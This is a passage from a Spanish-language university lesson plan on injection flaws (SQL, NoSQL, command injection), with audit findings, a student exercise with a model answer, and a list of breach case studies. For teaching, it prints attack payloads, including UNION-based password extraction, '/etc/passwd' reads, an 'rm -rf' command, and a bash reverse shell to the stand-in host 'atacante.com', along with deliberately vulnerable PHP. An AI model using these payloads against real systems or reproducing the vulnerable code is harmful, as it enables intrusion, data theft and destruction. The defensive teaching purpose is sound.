- **Payload de verificación:** `GET /buscar?precioMin[$gt]=0&precioMax[$lt]=99999` → devuelve todos los productos sin importar el filtro. Con `?categoria[$ne]=nada` → devuelve todas las categorías.
- **OWASP:** A03:2021 — Injection
- **Probabilidad:** 6/9 (requiere conocimiento de la sintaxis de MongoDB y que qs esté habilitado)
- **Impacto:** 7/9 (exposición de catálogo completo, bypass de filtros de precio, potencial exposición de precios internos)
- **Riesgo:** ALTO
- **Fix:**
```javascript
// Validar que sean números antes de usar
const precioMinNum = parseFloat(precioMin);
const precioMaxNum = parseFloat(precioMax);
if (precioMin && isNaN(precioMinNum)) return res.status(400).json({ error: 'precioMin debe ser número' });
if (precioMin) filtro.precio.$gte = precioMinNum; // Número, no objeto
```

**Hallazgo 3 — diagnostico.py — Command Injection Crítica:**
- **Vulnerabilidad exacta:** `os.popen(f"ping -c 3 {servidor} 2>&1")` ejecuta el shell con el input del usuario directamente interpolado.
- **Payload de verificación:** `?servidor=127.0.0.1; cat /etc/passwd` → ejecuta ping y luego muestra el archivo de usuarios del sistema.
- **Impacto concreto:** Ejecución arbitraria de comandos con los privilegios del proceso web. En peor caso: `?servidor=127.0.0.1; bash -i >& /dev/tcp/atacante.com/4444 0>&1` — reverse shell completo al servidor.
- **Agravante:** El endpoint está bajo `/admin/` pero no se ve verificación de autenticación/autorización en el fragmento — doble vulnerabilidad.
- **OWASP:** A03:2021 — Injection (command injection) + potencialmente A01:2021 (si no hay autenticación de admin)
- **Probabilidad:** 8/9 (si es accesible, trivial de explotar)
- **Impacto:** 9/9 (control total del servidor)
- **Riesgo:** CRÍTICO
- **Fix:**
```python
import subprocess, re
def admin_ping():
    servidor = request.args.get('servidor', '').strip()
    if not re.match(r'^[a-zA-Z0-9.\-]{1,255}$', servidor):
        return jsonify({'error': 'Servidor inválido'}), 400
    resultado = subprocess.run(
        ['ping', '-c', '3', servidor],
        capture_output=True, text=True, timeout=15
    )
    return jsonify({'resultado': resultado.stdout})
```

---

### 4b. EJERCICIO INDIVIDUAL (15 minutos) {#ejercicio-individual}

**Instrucción para el docente:** Distribuir el siguiente fragmento de forma individual (impreso o en el aula virtual). No trabajar en grupos. El docente no responde preguntas de contenido durante este ejercicio — solo aclara dudas sobre el enunciado.

---

#### Código PHP vulnerable para analizar

```php
<?php
// ShopPerú — Sistema de Tienda en Línea
// Archivo: buscar_producto.php

// =====================================================
// FRAGMENTO 1: Búsqueda de productos
// =====================================================

$conn = new mysqli("localhost", "root", "", "shopdb");

$termino = $_GET['q'];              // Input del usuario
$categoria = $_GET['categoria'];    // Input del usuario

$sql = "SELECT nombre, precio, descripcion 
        FROM productos 
        WHERE nombre LIKE '%" . $termino . "%' 
        AND categoria = '" . $categoria . "'";

$resultado = $conn->query($sql);

while ($fila = $resultado->fetch_assoc()) {
    echo "<div class='producto'>";
    echo "<h2>" . $fila['nombre'] . "</h2>";
    echo "<p>Precio: S/" . $fila['precio'] . "</p>";
    echo "</div>";
}

// =====================================================
// FRAGMENTO 2: Panel de administrador — ejecutar backup
// =====================================================

if (isset($_POST['ejecutar_backup'])) {
    $base_datos = $_POST['nombre_bd'];   // Nombre de la base de datos a respaldar
    $directorio = $_POST['directorio'];   // Directorio donde guardar el backup
    
    // El admin ingresa el nombre de la BD y el directorio de destino
    $comando = "mysqldump -u root -proot123 " . $base_datos . " > " . $directorio . "/backup.sql";
    shell_exec($comando);
    
    echo "Backup completado en " . $directorio . "/backup.sql";
}
?>
```

---

#### Tarea del estudiante

Analiza el código PHP anterior y completa lo siguiente:

**Parte A — Identificación:**
1. ¿Cuántas vulnerabilidades de inyección existen? Identifica cada una con la línea exacta del código donde ocurre.
2. Para cada vulnerabilidad, escribe un payload de ataque específico que demostraría la explotación.

**Parte B — Clasificación:**
3. Clasifica cada vulnerabilidad según OWASP A03:2021 — especifica el subtipo (SQL injection, command injection, etc.).
4. Evalúa probabilidad e impacto (escala 1-9) y determina el nivel de riesgo.

**Parte C — Riesgo:**
5. ¿Qué información podría robar un atacante con el Fragmento 1? Sé específico.
6. ¿Qué podría hacer un atacante con el Fragmento 2? Menciona al menos 3 acciones concretas.

**Parte D — Fix:**
7. Reescribe el Fragmento 1 usando sentencias preparadas en PHP (PDO o mysqli con prepared statements).
8. Reescribe el Fragmento 2 para eliminar la command injection manteniendo la funcionalidad de backup.

---

#### Criterio de éxito

El estudiante demuestra haber logrado el aprendizaje si:
- Identifica AMBAS vulnerabilidades (sin omitir ninguna) con la línea de código exacta
- El payload que escribe es funcionalmente correcto (modificaría la consulta/comando de forma demostrable)
- Clasifica correctamente como SQLi y command injection
- El código corregido usa sentencias preparadas reales (no solo escapa comillas) y subprocess con lista o equivalente en PHP
- Explica el impacto de forma concreta (qué datos, qué acciones — no genérico)

---

#### Respuesta modelo (para el docente, no compartir hasta el cierre)

**Vulnerabilidad 1 — SQL Injection en línea 13:**
```
$sql = "SELECT ... WHERE nombre LIKE '%" . $termino . "%' AND categoria = '" . $categoria . "'";
```
- Payload en `termino`: `%' UNION SELECT usuario, password, 3 FROM usuarios-- `
- Payload en `categoria`: `' OR '1'='1`
- Impacto: extracción de todos los productos sin filtro, extracción de tabla de usuarios, extracción de contraseñas

**Fix PHP con PDO:**
```php
$pdo = new PDO("mysql:host=localhost;dbname=shopdb", "usuario", "password");
$stmt = $pdo->prepare("SELECT nombre, precio, descripcion FROM productos WHERE nombre LIKE ? AND categoria = ?");
$stmt->execute(['%' . $termino . '%', $categoria]);
$resultado = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

**Vulnerabilidad 2 — Command Injection en línea 30:**
```
$comando = "mysqldump -u root -proot123 " . $base_datos . " > " . $directorio . "/backup.sql";
```
- Payload en `nombre_bd`: `shopdb; cat /etc/passwd > /var/www/html/leaked.txt`
- Payload en `directorio`: `/tmp; rm -rf /var/www/html`
- 3 acciones concretas: (1) leer cualquier archivo del servidor, (2) eliminar archivos del servidor web, (3) exfiltrar la contraseña de root de MySQL (está hardcodeada en el comando) hacia un servidor externo.

**Fix PHP para backup (sin command injection):**
```php
// Validar que nombre_bd solo contenga alfanuméricos y guiones bajos
if (!preg_match('/^[a-zA-Z0-9_]{1,64}$/', $base_datos)) {
    die('Nombre de base de datos inválido');
}
// Validar directorio en lista blanca
$directorios_permitidos = ['/var/backups/mysql', '/home/backups'];
if (!in_array($directorio, $directorios_permitidos)) {
    die('Directorio no permitido');
}
// Usar escapeshellarg para el directorio (aunque esté en whitelist)
$archivo_destino = escapeshellarg($directorio . '/backup_' . date('Ymd') . '.sql');
// Alternativamente, usar la API de mysqldump de PHP sin shell
exec('mysqldump --user=backupuser --password=backuppass ' . escapeshellarg($base_datos) . ' > ' . $archivo_destino);
```

---

## 5. CIERRE (10 minutos) {#cierre}

---

### 5a. SÍNTESIS COLABORATIVA (4 minutos)

**Instrucción para el docente:** Hacer las preguntas al grupo completo. Esperar respuestas voluntarias. Completar o corregir según sea necesario.

---

**Pregunta de cierre 1:**

> "Con todo lo que vieron hoy, ¿cuál es la causa raíz COMÚN que permite los tres tipos de inyección que estudiamos — SQL, NoSQL y de comandos? En una sola frase."

**Respuesta esperada DETALLADA:**

La causa raíz común es la mezcla de datos no confiables con código ejecutable sin separación clara entre ambos. En los tres casos — SQL injection, NoSQL injection y command injection — el problema es que el sistema trata el input del usuario como parte de una instrucción que será interpretada o ejecutada (una consulta SQL, un objeto de consulta MongoDB, un comando del sistema operativo), en lugar de tratarlo como datos puros. La solución en los tres casos sigue el mismo principio: separar el código (la instrucción) de los datos (el input del usuario) mediante mecanismos que garanticen que los datos nunca serán interpretados como código: prepared statements para SQL, validación de tipos para NoSQL, y subprocess con lista para comandos del sistema.

---

**Pregunta de cierre 2:**

> "Si mañana empiezan a trabajar en una empresa y les asignan un proyecto existente en Flask con acceso a una base de datos PostgreSQL, ¿cuál sería el PRIMER paso concreto que harían para evaluar si hay SQL injection?"

**Respuesta esperada DETALLADA:**

El primer paso concreto sería una búsqueda en el código fuente de los patrones más comunes de SQL injection: buscar todas las ocurrencias donde se construyen strings de consulta SQL usando concatenación o f-strings que incluyan variables. Específicamente, buscaría con grep (o la función de búsqueda del IDE) los patrones: `f"SELECT`, `f"INSERT`, `f"UPDATE`, `f"DELETE`, `"SELECT" +`, `"WHERE" +`. Cada ocurrencia encontrada es un candidato a vulnerabilidad. Para cada una, verificaría: (1) ¿el valor concatenado proviene de un input del usuario (request, formulario, parámetro de URL)? y (2) ¿se está usando un parámetro marcador (`%s` en psycopg2 o `?` en sqlite3) o concatenación directa? Las que usen concatenación directa de variables que provienen del usuario son vulnerabilidades confirmadas. Paralelamente, haría una revisión dinámica rápida con SQLMap en las URLs más críticas (login, búsqueda, filtros) con `--level 1 --risk 1` para confirmar.

---

**Pregunta de cierre 3:**

> "¿Por qué OWASP agrupa SQL Injection, NoSQL Injection y Command Injection en una sola categoría A03:2021 — Injection, en lugar de tener categorías separadas?"

**Respuesta esperada DETALLADA:**

OWASP las agrupa bajo una misma categoría porque comparten el mismo patrón fundamental de vulnerabilidad — datos no confiables son enviados a un intérprete como parte de un comando o consulta — y las mismas familias de soluciones: separar datos de instrucciones, validar tipos y formatos, usar APIs seguras (prepared statements, subprocess con lista, etc.). Desde la perspectiva de gestión de riesgos y priorización de controles, tiene más sentido que una organización implemente una política de "nunca concatenar input del usuario en ningún tipo de instrucción" como control único, que tener políticas separadas para SQL, NoSQL y comandos. Además, agregar las estadísticas permite que la categoría A03:2021 refleje la magnitud real del problema — si SQLi, NoSQL injection, command injection, LDAP injection y XPath injection fueran categorías separadas, cada una tendría porcentajes menores y podría ser subestimada por los equipos de desarrollo. Al agruparlas, el 94% de incidencia de la categoría communica correctamente cuán prevalente y urgente es el problema.

---

### 5b. METACOGNICIÓN (3 minutos)

**Instrucción para el docente:** Pedir que en su cuaderno, hoja de apuntes o dispositivo, cada estudiante escriba individualmente su respuesta. No compartir en voz alta — es reflexión personal.

**Pregunta reflexiva:**

> "Hoy estudiaron tres tipos de vulnerabilidades de inyección. Piensen en el proyecto de base de datos o aplicación web que desarrollaron en el curso de Bases de Datos o Desarrollo Web el ciclo pasado. Con lo que aprendieron hoy: ¿su código habría sido vulnerable a alguno de estos ataques? ¿Cuál? ¿Qué habrían cambiado?"

**Propósito pedagógico:** Esta pregunta conecta el nuevo conocimiento con experiencias previas concretas del estudiante, activa la transferencia y genera consciencia sobre la seguridad en el código que ya han escrito — haciendo el aprendizaje personalmente relevante y emocionalmente significativo.

---

### 5c. TAREA / PUENTE HACIA SEMANA 6 (3 minutos)

**Guion verbal del docente:**

> "Para la próxima semana vamos a ver Cross-Site Scripting (XSS) e Inyección de Código del lado cliente — que es el complemento de lo que vimos hoy. Si las inyecciones de hoy atacan el servidor, XSS ataca al usuario desde el servidor. Para prepararse:"

**Tarea concreta:**

1. **Lectura:** Leer la sección OTG-CLIENT-007 del OWASP Testing Guide v4.2 sobre Cross-Site Scripting. Disponible en: `https://owasp.org/www-project-web-security-testing-guide/`

2. **Ejercicio práctico:** Instalar DVWA (Damn Vulnerable Web Application) en su máquina local usando Docker:
   ```bash
   docker pull vulnerables/web-dvwa
   docker run -d -p 80:80 vulnerables/web-dvwa
   # Acceder a http://localhost
   # Credenciales: admin / password
   # Configurar Security Level a "Low"
   ```
   Navegar a la sección "SQL Injection" de DVWA y probar los payloads que vieron hoy. Anotar qué payloads funcionan y cuáles no.

3. **Reflexión escrita (5 líneas):** Responder: "¿En qué se parecen y en qué se diferencian las vulnerabilidades que podría encontrar en DVWA con lo que vimos en el caso RetailApp?"

**Entregable:** Las notas del ejercicio en DVWA se discutirán al inicio de la sesión 6 durante la revisión de sesión anterior.

---

## GUION VERBAL SUGERIDO {#guion-verbal}

**5 momentos clave con frases textuales:**

---

**Momento 1 — Al presentar el código vulnerable por primera vez (T2):**

> "Quiero que todos miren este código. A primera vista parece normal, ¿verdad? Un login básico. [Pausa] Pero aquí, en esta línea específica — [señala la concatenación del f-string] — hay un error que ha costado miles de millones de dólares a empresas reales. El problema no es la lógica del programa — la lógica es correcta. El problema es que el desarrollador confió en que el usuario siempre ingresaría su nombre de usuario real. Y los atacantes no se comportan como usuarios normales. Los atacantes ingresan exactamente lo que el sistema NO espera."

---

**Momento 2 — Al mostrar el payload `' OR '1'='1'--`:**

> "Miren lo que pasa cuando escribimos esto en el campo de usuario. [Escribe en el proyector el payload] La consulta que el desarrollador diseñó para buscar UN usuario específico ahora devuelve TODOS los usuarios. ¿Por qué? Porque '1'='1' siempre es verdadero. Siempre. Sin excepción. Y el sistema no sabe que ese 'siempre verdadero' lo puso un atacante — el motor de base de datos simplemente ejecuta lo que le llega. Esta es la esencia de la inyección: el sistema no distingue entre código que vino del desarrollador y código que vino del atacante."

---

**Momento 3 — Al presentar la solución (consulta parametrizada):**

> "La solución parece increíblemente simple una vez que la ven. Y lo es. [Muestra el código seguro] En lugar de construir una consulta como texto — mezclando el SQL del desarrollador con el input del usuario — le decimos al motor de base de datos: 'Esta es la ESTRUCTURA de la consulta, con estos marcadores de posición. Y ESTOS son los valores que van ahí.' El motor procesa primero la estructura, la compila, la entiende como código SQL. Y luego aplica los valores — lo que ingresó el usuario — como DATOS, no como código. Si el atacante escribe `' OR '1'='1'--`, ese string se busca literalmente como nombre de usuario. No se interpreta como código SQL. Y por supuesto, no existe ningún usuario con ese nombre, así que el acceso es denegado. Un cambio de 2 líneas de código. Una diferencia de $130 millones de dólares."

---

**Momento 4 — Al iniciar el trabajo grupal:**

> "Ahora es su turno. Tienen ante ustedes el código de RetailApp — una empresa con 50,000 clientes reales, con sus datos personales y financieros. Su trabajo es el de un auditor de seguridad contratado. No busco que me digan 'hay un problema de seguridad aquí' — eso lo sabe cualquiera. Quiero que me digan EXACTAMENTE dónde está la línea vulnerable, QUÉ input escribiría el atacante, QUÉ haría la base de datos o el sistema con ese input, y CÓMO corregirían el código. Eso es lo que diferencia a un ingeniero de seguridad de alguien que leyó un artículo sobre hacking. Tienen 20 minutos. Voy a circular y hacerles preguntas."

---

**Momento 5 — Al cerrar la sesión:**

> "Hoy aprendieron algo que la mayoría de desarrolladores en el mercado laboral peruano no sabe o no practica consistentemente. El 94% de las aplicaciones probadas por OWASP tienen alguna forma de inyección. Eso significa que en su primer trabajo — ya sea en una startup, en una empresa grande, en el gobierno — van a encontrar código vulnerable. Van a ver exactamente lo que vieron hoy. La diferencia ahora es que ustedes saben reconocerlo, saben explicarle el riesgo a su equipo y saben cómo arreglarlo. Eso tiene valor real en el mercado. Nos vemos la próxima semana con XSS."

---

## CASOS REALES RECOMENDADOS {#casos-reales}

---

**Caso 1 — Heartland Payment Systems (2008)**
- **Descripción:** Albert Gonzalez y su equipo explotaron SQL injection en el portal web de Heartland, instalaron malware de captura en la red interna y extrajeron datos de más de 130 millones de tarjetas de crédito/débito durante meses antes de ser detectados. Fue la mayor brecha de datos de tarjetas en la historia de EE.UU. hasta ese momento.
- **Impacto:** Más de $130 millones en multas, litigios, compensaciones a bancos e instituciones financieras. El CEO renunció. La empresa perdió su certificación PCI-DSS temporalmente.
- **Fuente:** Department of Justice U.S. v. Gonzalez, Case No. 1:08-cr-10223-PBS (2010). Disponible en documentos públicos del DOJ.

---

**Caso 2 — LinkedIn (2012-2016)**
- **Descripción:** En 2012 se anunció una brecha con 6.5 millones de hashes de contraseñas publicadas. En 2016, un actor de amenazas puso a la venta 117 millones de credenciales de LinkedIn en la dark web por 5 Bitcoin (~$2,200 en ese momento). El vector inicial fue SQL injection que permitió extraer la base de datos de usuarios. Las contraseñas usaban SHA-1 sin salt, lo que permitió crackear la mayoría en días.
- **Impacto:** 117 millones de usuarios comprometidos, multa de $1.25 millones en el Reino Unido, demandas colectivas en EE.UU., daño reputacional significativo.
- **Fuente:** LeakedSource (2016). LinkedIn Security Update: May 2016. Noticias: Vice Motherboard (2016).

---

**Caso 3 — RockYou (2009)**
- **Descripción:** RockYou, empresa de aplicaciones sociales (juegos y widgets para Facebook y MySpace), fue atacada mediante SQL injection que explotó una vulnerabilidad en su sitio PHP. El atacante extrajo 32,603,388 contraseñas de usuarios almacenadas en texto plano en MySQL. El atacante publicó la base de datos para demostrar la vulnerabilidad.
- **Impacto:** 32 millones de usuarios comprometidos. La base de datos "rockyou.txt" se convirtió en el diccionario de contraseñas más usado en la industria de seguridad — está incluido por defecto en Kali Linux y es el primer recurso que los pentesters usan en ataques de diccionario.
- **Fuente:** Imperva (2010). Consumer Password Worst Practices. Technical Report.

---

**Caso 4 — Verizon Business (TJX Companies, 2007)**
- **Descripción:** TJX Companies (propietaria de TJ Maxx, Marshalls) sufrió la mayor brecha de datos de tarjetas de crédito conocida hasta ese momento. Aunque el vector inicial fue una red WiFi sin cifrado, la extracción masiva de datos involucró SQL injection para navegar por la base de datos interna. Más de 94 millones de números de tarjetas de crédito y débito fueron robados.
- **Impacto:** $256 millones en costos directos para TJX. Multas de la FTC, demandas de bancos. Gonzalez (el mismo que Heartland) fue involucrado.
- **Fuente:** Verizon Business (2008). 2008 Data Breach Investigations Report.

---

**Caso 5 — Drupal "Drupalgeddon" (CVE-2014-3704, 2014)**
- **Descripción:** Una vulnerabilidad de SQL injection en el núcleo del CMS Drupal afectó a millones de sitios web simultáneamente. El fallo estaba en la abstracción de base de datos de Drupal — los arrays de condiciones WHERE no sanitizaban correctamente los nombres de las claves, permitiendo inyección. Se estimó que en las primeras 7 horas de publicación del parche, la mayoría de sitios sin actualizar ya habían sido comprometidos por bots automatizados.
- **Impacto:** Miles de sitios Drupal comprometidos mundialmente. El equipo de seguridad de Drupal emitió el comunicado histórico: "Si su sitio no fue parcheado en las primeras 7 horas, asuma que está comprometido."
- **Fuente:** Drupal Security Team (2014). Public Service Announcement: Drupal core - Highly Critical - SQL Injection. SA-CORE-2014-005. Disponible en: https://www.drupal.org/forum/newsletters/security-public-service-announcements/2014-10-29/drupal-core-highly-critical-sql

---

## EVALUACIÓN FORMATIVA {#evaluacion-formativa}

La evaluación formativa es continua durante la sesión y no genera calificación numérica. Su propósito es que el docente ajuste el ritmo y que el estudiante identifique sus brechas de aprendizaje en tiempo real.

---

### Momentos de evaluación formativa y qué observar:

| Momento | Técnica | Qué observar | Cómo reaccionar |
|---------|---------|--------------|-----------------|
| **Diagnóstico inicial (1d)** | Preguntas orales | ¿Conocen SQL? ¿Saben qué es un prepared statement? | Si menos del 50% conoce prepared statements, agregar 3 min de explicación básica en T2 antes del código seguro |
| **Mini actividad T1** | Clasificación de fases | ¿Ubican correctamente Reconnaissance vs Discovery? | Si hay confusión, reforzar con un ejemplo adicional de la vida real |
| **Mini actividad T3** | Clasificación de payloads | ¿Distinguen boolean-based de time-based? | Si confunden, hacer una analogía: "boolean-based es como preguntar ¿sí o no?; time-based es como preguntar ¿cuánto tardate?" |
| **Trabajo grupal (4a)** | Observación directa + andamiaje | ¿El grupo identifica ambas vulnerabilidades en cada fragmento? ¿El fix que proponen usa prepared statements reales? | Si el grupo "escapa comillas" como fix: "¿Qué pasaría si el atacante usa un número en lugar de texto?" para guiar a la solución correcta |
| **Ejercicio individual (4b)** | Producción escrita | ¿Identifica las 2 vulnerabilidades? ¿El código corregido es funcional? | Circular y dar retroalimentación verbal inmediata: "Bien, identificaste la primera. Ahora busca el segundo lugar donde hay un problema similar" |
| **Preguntas de cierre (5a)** | Discusión oral | ¿Verbalizan la causa raíz común correctamente? | Si la respuesta es superficial: "Bien dicho. Ahora, ¿cómo expresarías eso en términos que entienda un desarrollador junior?" |

---

### Rúbrica informal de desempeño durante la sesión:

**Nivel Logrado:**
- Identifica la línea exacta de código donde ocurre la inyección
- Escribe un payload que funcionalmente modificaría la consulta o comando
- Propone un fix que usa la técnica correcta (prepared statement, validación de tipos, subprocess con lista)
- Explica el impacto de forma concreta (qué datos, qué acciones — no "puede robar información")

**Nivel En Proceso:**
- Identifica la vulnerabilidad de forma general pero no la línea exacta
- Entiende el concepto del payload pero comete errores de sintaxis
- Propone un fix parcialmente correcto (ej: escapa comillas pero no usa prepared statement)
- Describe el impacto de forma genérica

**Nivel Inicial:**
- Requiere andamiaje del docente para identificar la vulnerabilidad
- No puede construir un payload sin ayuda
- Confunde el fix (cree que validar longitud del campo es suficiente)
- No puede articular el impacto

---

## REFERENCIAS APA 7 {#referencias}

OWASP Foundation. (2021). *OWASP Top 10 — 2021*. https://owasp.org/Top10/

OWASP Foundation. (2020). *OWASP Testing Guide v4.2*. https://owasp.org/www-project-web-security-testing-guide/

Clarke, J. (2009). *SQL Injection Attacks and Defense* (2nd ed.). Syngress. https://doi.org/10.1016/C2009-0-01802-4

Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.

Sadeghipour, A., Mundhenk, M., & Knapp, A. (2023). Automated Detection of SQL Injection Vulnerabilities in Web Applications Using Machine Learning. *Journal of Information Security and Applications, 76*, 103529. https://doi.org/10.1016/j.jisa.2023.103529

Nist National Vulnerability Database. (2014). *CVE-2014-3704 Detail — Drupal SQL Injection*. https://nvd.nist.gov/vuln/detail/CVE-2014-3704

Segura, J., & Portillo-Dominguez, A. O. (2022). NoSQL Injection in Web Applications: A Systematic Review. *IEEE Access, 10*, 127853–127868. https://doi.org/10.1109/ACCESS.2022.3226756

Verizon Business. (2023). *2023 Data Breach Investigations Report (DBIR)*. https://www.verizon.com/business/resources/reports/dbir/

---

## RECURSOS REALES {#recursos}

### Documentación oficial:

- **OWASP Top 10 2021 — A03: Injection:** https://owasp.org/Top10/A03_2021-Injection/
- **OWASP Testing Guide v4.2 — OTG-INPVAL-005 (SQL Injection):** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- **OWASP Testing Guide v4.2 — OTG-INPVAL-013 (Command Injection):** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- **OWASP SQL Injection Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **OWASP Query Parameterization Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- **OWASP NoSQL Injection:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection

---

### Herramientas gratuitas para práctica:

- **SQLMap (open source, GitHub):** https://github.com/sqlmapproject/sqlmap
  ```bash
  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
  ```
- **DVWA — Damn Vulnerable Web Application (entorno de práctica legal):** https://github.com/digininja/DVWA
  ```bash
  docker pull vulnerables/web-dvwa
  docker run -d -p 80:80 vulnerables/web-dvwa
  ```
- **OWASP WebGoat (aplicación vulnerable para aprender):** https://github.com/WebGoat/WebGoat
  ```bash
  docker run -it -p 127.0.0.1:8080:8080 webgoat/webgoat
  ```
- **HackTheBox Starting Point (plataforma gratuita para práctica legal):** https://www.hackthebox.com/starting-point
- **PortSwigger Web Security Academy — SQL Injection Labs (gratuito):** https://portswigger.net/web-security/sql-injection
- **Burp Suite Community Edition (herramienta de interceptación de requests):** https://portswigger.net/burp/communitydownload

---

### Repositorios de referencia en GitHub:

- **PayloadsAllTheThings — colección de payloads de SQLi y command injection:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists — listas de payloads usadas en pentesting:** https://github.com/danielmiessler/SecLists
- **OWASP Cheat Sheet Series (código fuente de las guías):** https://github.com/OWASP/CheatSheetSeries

---

### Laboratorios en línea (gratuitos, legales):

- **TryHackMe — Room "SQL Injection":** https://tryhackme.com/room/sqlinjectionlm
- **TryHackMe — Room "Command Injection":** https://tryhackme.com/room/oscommandinjection
- **PortSwigger SQL Injection Labs (17 laboratorios progresivos):** https://portswigger.net/web-security/all-labs#sql-injection

---

*Documento elaborado para uso docente — Programación Segura — Semana 5 — Universidad Autónoma del Perú — Ciclo 2026-1*
*Actualizado: Julio 2026*
